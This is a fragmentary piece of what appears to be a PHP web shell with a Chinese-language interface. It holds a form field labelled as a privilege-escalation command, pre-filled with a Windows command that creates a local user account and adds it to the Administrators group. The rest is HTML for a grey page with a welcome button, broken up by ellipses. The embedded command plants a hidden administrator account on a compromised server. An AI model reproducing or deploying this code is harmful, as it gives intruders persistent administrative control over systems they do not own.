...
{
print<<<END
<div class="actall">提权命令 <input name="SUCommand" type="text" value="cmd /c net user 1005201757 3421363 /add & net localgroup administrators 1005201757 /add" style="width:600px"><br>
...
<html>
	<body style="background:#AAAAAA;">
		...
		<div style="width:350px;height:80px;clear:both;"><input type="submit" value="欢迎" style="width:80px;"></div>
		</div>
		</form>
		</center>
	</body>
